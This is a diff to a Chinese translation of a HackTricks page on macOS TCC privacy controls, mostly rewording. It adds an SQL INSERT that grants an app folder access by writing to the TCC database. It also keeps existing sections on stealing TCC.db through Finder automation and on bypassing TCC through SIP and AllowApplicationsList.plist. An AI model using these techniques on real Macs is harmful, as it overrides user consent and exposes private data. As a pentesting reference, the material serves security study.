@@ -14,17 +14,17 @@
 
 ## **基本信息**
 
-**TCC (Transparency, Consent, and Control)** 是 macOS 中的一种机制，用于从隐私的角度**限制和控制应用程序对某些功能的访问**。这可以包括位置服务、联系人、照片、麦克风、摄像头、辅助功能、完全磁盘访问等等。
+**TCC (Transparency, Consent, and Control)** 是 macOS 中的一种机制，用于从隐私角度**限制和控制应用程序对某些功能的访问**。这些功能可以包括位置服务、联系人、照片、麦克风、摄像头、辅助功能、完全磁盘访问等等。
 
-从用户的角度来看，当应用程序要访问受 TCC 保护的功能时，他们会看到 TCC 的作用。当这种情况发生时，**用户会收到一个对话框**，询问他们是否允许访问。
+从用户的角度来看，当应用程序要访问受 TCC 保护的功能时，他们会看到 TCC 的作用。这时，用户会收到一个对话框，询问他们是否允许访问。
 
-用户也可以通过**显式意图**向应用程序授予对文件的访问权限，例如当用户**将文件拖放到程序中**时（显然程序应该具有对文件的访问权限）。
+用户也可以通过**显式意图**向应用程序授予对文件的访问权限，例如当用户将文件**拖放到程序中**时（显然程序应该具有对文件的访问权限）。
 
 ![TCC提示的示例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)
 
 **TCC** 由位于 `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` 的**守护进程**处理，并在 `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` 中进行配置（注册 mach 服务 `com.apple.tccd.system`）。
 
-每个已登录用户定义的**用户模式 tccd**在 `/System/Library/LaunchAgents/com.apple.tccd.plist` 中运行，注册 mach 服务 `com.apple.tccd` 和 `com.apple.usernotifications.delegate.com.apple.tccd`。
+每个已登录用户定义了一个在用户模式下运行的 tccd，其位置在 `/System/Library/LaunchAgents/com.apple.tccd.plist`，注册了 mach 服务 `com.apple.tccd` 和 `com.apple.usernotifications.delegate.com.apple.tccd`。
 
 在这里，你可以看到作为系统和用户运行的 tccd：
 ```bash
@@ -109,11 +109,11 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 {% endtabs %}
 
 {% hint style="success" %}
-检查这两个数据库，您可以查看应用程序已允许、禁止或未拥有的权限（它会要求您）。
+检查这两个数据库，您可以查看应用程序已允许、禁止或未拥有的权限（它会要求您提供权限）。
 {% endhint %}
 
-* **`auth_value`** 可以有不同的值：denied(0)、unknown(1)、allowed(2)或limited(3)。
-* **`auth_reason`** 可以采用以下值：Error(1)、User Consent(2)、User Set(3)、System Set(4)、Service Policy(5)、MDM Policy(6)、Override Policy(7)、Missing usage string(8)、Prompt Timeout(9)、Preflight Unknown(10)、Entitled(11)、App Type Policy(12)
+* **`auth_value`** 可以有不同的值：denied（0）、unknown（1）、allowed（2）或limited（3）。
+* **`auth_reason`** 可以采用以下值：Error（1）、User Consent（2）、User Set（3）、System Set（4）、Service Policy（5）、MDM Policy（6）、Override Policy（7）、Missing usage string（8）、Prompt Timeout（9）、Preflight Unknown（10）、Entitled（11）、App Type Policy（12）
 * **csreq** 字段用于指示如何验证要执行的二进制文件并授予 TCC 权限：
 ```
 # Query to get cserq in printable hex
@@ -165,7 +165,7 @@ TCC **数据库**存储了应用程序的**Bundle ID**，但它还会**存储**�
 {% code overflow="wrap" %}
 ```bash
 # From sqlite
-sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
+sqlite> select service, client, hex(csreq) from access where auth_value=2;
 #Get csreq
 
 # From bash
@@ -228,21 +228,63 @@ otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| gr
 uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
 ```
 {% hint style="info" %}
-有趣的是，**`com.apple.macl`** 属性由 **Sandbox** 管理，而不是 tccd。
+有趣的是，**`com.apple.macl`**属性由**沙盒**管理，而不是tccd。
 
-还要注意，如果将允许计算机上某个应用程序的 UUID 的文件移动到另一台计算机上，因为相同的应用程序将具有不同的 UID，它不会授予该应用程序访问权限。
+还要注意，如果将允许计算机上某个应用程序的UUID的文件移动到另一台计算机上，因为相同的应用程序将具有不同的UID，它不会授予对该应用程序的访问权限。
 {% endhint %}
 
-扩展属性 `com.apple.macl` 无法像其他扩展属性一样被清除，因为它受到 SIP 的保护。然而，正如[**在这篇文章中解释的**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)，可以通过将文件进行压缩、删除和解压缩的方式来禁用它。
+扩展属性`com.apple.macl`无法像其他扩展属性一样被清除，因为它受到SIP的保护。然而，正如[**在这篇文章中解释的**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)，可以通过将文件进行**压缩**，**删除**它，然后**解压缩**来禁用它。
 
-## TCC 权限提升和绕过
+## TCC权限提升和绕过
 
-### 从 Automation 到 FDA 的权限提升
+### 插入到TCC
 
-**Finder** 是一个始终具有 FDA 权限的应用程序（即使在用户界面中看不到），因此如果您对其具有 **Automation** 权限，可以滥用其权限来执行一些操作。
+如果你成功获得对TCC数据库的写访问权限，你可以使用以下类似的方法来添加一个条目（删除注释）：
+```
+INSERT INTO access (
+service,
+client,
+client_type,
+auth_value,
+auth_reason,
+auth_version,
+csreq,
+policy_id,
+indirect_object_identifier_type,
+indirect_object_identifier,
+indirect_object_code_identity,
+flags,
+last_modified,
+pid,
+pid_version,
+boot_uuid,
+last_reminded
+) VALUES (
+'kTCCServiceSystemPolicyDesktopFolder', -- service
+'com.googlecode.iterm2', -- client
+0, -- client_type (0 - bundle id)
+2, -- auth_value  (2 - allowed)
+3, -- auth_reason (3 - "User Set")
+1, -- auth_version (always 1)
+X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
+NULL, -- policy_id
+NULL, -- indirect_object_identifier_type
+'UNUSED', -- indirect_object_identifier - default value
+NULL, -- indirect_object_code_identity
+0, -- flags
+strftime('%s', 'now'), -- last_modified with default current timestamp
+NULL, -- assuming pid is an integer and optional
+NULL, -- assuming pid_version is an integer and optional
+'UNUSED', -- default value for boot_uuid
+strftime('%s', 'now') -- last_reminded with default current timestamp
+);
+```
+### 从自动化到FDA的权限提升
+
+**Finder** 是一个应用程序，它**始终具有FDA权限**（即使在用户界面中不可见），因此如果您对其具有**自动化**权限，您可以滥用其权限来**执行一些操作**。
 
 {% tabs %}
-{% tab title="窃取用户的 TCC.db" %}
+{% tab title="窃取用户的TCC.db" %}
 ```applescript
 # This AppleScript will copy the system TCC database into /tmp
 osascript<<EOD
@@ -291,13 +333,13 @@ EOD
 
 ### 从FDA到TCC权限的权限提升
 
-我不认为这是真正的权限提升，但以防万一您觉得有用：如果您控制具有FDA的程序，您可以**修改用户TCC数据库并赋予自己任何访问权限**。这可以作为一种持久性技术，在您可能失去FDA权限的情况下非常有用。
+我不认为这是真正的权限提升，但以防万一您发现它有用：如果您控制具有FDA的程序，您可以**修改用户TCC数据库并赋予自己任何访问权限**。这可以作为一种持久性技术，在您可能失去FDA权限的情况下非常有用。
 
 ### 从SIP绕过到TCC绕过
 
-系统的**TCC数据库**受到**SIP**的保护，因此只有具有**指定权限的进程才能修改**它。因此，如果攻击者找到了一个**绕过SIP的方法**（能够修改受SIP限制的文件），他将能够**移除TCC数据库的保护**并赋予自己所有TCC权限。
+系统的**TCC数据库**受到**SIP**的保护，因此只有具有**指定权限的进程才能修改**它。因此，如果攻击者找到了一个**绕过SIP的方法**（能够修改受SIP限制的文件），他将能够**移除**TCC数据库的保护，并赋予自己所有TCC权限。
 
-然而，还有另一种滥用**SIP绕过来绕过TCC**的选项，文件`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`是一个需要TCC异常的应用程序允许列表。因此，如果攻击者可以**移除此文件的SIP保护**并添加自己的**应用程序**，该应用程序将能够绕过TCC。\
+但是，还有另一种滥用**SIP绕过来绕过TCC**的选项，文件`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`是一个需要TCC异常的应用程序的允许列表。因此，如果攻击者可以**移除此文件的SIP保护**并添加自己的**应用程序**，该应用程序将能够绕过TCC。\
 例如，要添加终端：
 ```bash
 # Get needed info
@@ -313,31 +355,9 @@ AllowApplicationsList.plist是一个macOS访问控制列表（ACL）文件，用
 
 请注意，编辑AllowApplicationsList.plist文件需要管理员权限。在进行任何更改之前，请确保您了解每个应用程序的标识符和所需的访问权限。
 
-以下是AllowApplicationsList.plist文件的示例：
+编辑完成后，保存并退出文件。然后，您需要重新启动TCC服务，以使更改生效。您可以使用命令行工具或重启系统来完成此操作。
 
-```xml
-<dict>
-    <key>AllowedApplications</key>
-    <array>
-        <dict>
-            <key>Identifier</key>
-            <string>com.example.app1</string>
-            <key>Allowed</key>
-            <true/>
-        </dict>
-        <dict>
-            <key>Identifier</key>
-            <string>com.example.app2</string>
-            <key>Allowed</key>
-            <false/>
-        </dict>
-    </array>
-</dict>
-```
-
-在上面的示例中，com.example.app1被允许访问敏感数据和功能，而com.example.app2被禁止访问。
-
-请记住，在编辑AllowApplicationsList.plist文件时要小心，确保只允许可信任的应用程序访问敏感数据和功能，以保护用户的隐私和数据安全。
+通过编辑AllowApplicationsList.plist文件，您可以更好地控制macOS中应用程序的访问权限，从而提高系统的安全性和隐私保护。
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -380,9 +400,9 @@ AllowApplicationsList.plist是一个macOS访问控制列表（ACL）文件，用
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * 你在一个**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 发现我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
